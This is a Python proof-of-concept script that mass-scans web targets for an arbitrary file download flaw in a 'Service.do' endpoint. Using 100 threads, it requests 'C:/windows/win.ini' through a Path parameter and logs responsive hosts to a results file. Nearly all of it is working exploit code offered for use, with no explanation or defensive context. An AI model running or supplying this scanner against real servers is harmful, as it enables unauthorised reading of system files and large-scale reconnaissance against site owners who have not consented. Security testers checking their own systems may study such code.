import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6", "Connection": "close"}
    payload = "/Service.do?Action=Download&Path=C:/windows/win.ini"
    try:
        res1 = requests.get(url=target,verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
            if 'fonts' in res2.text:
                print(f'[+]存在漏洞：{target}')
                with open('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()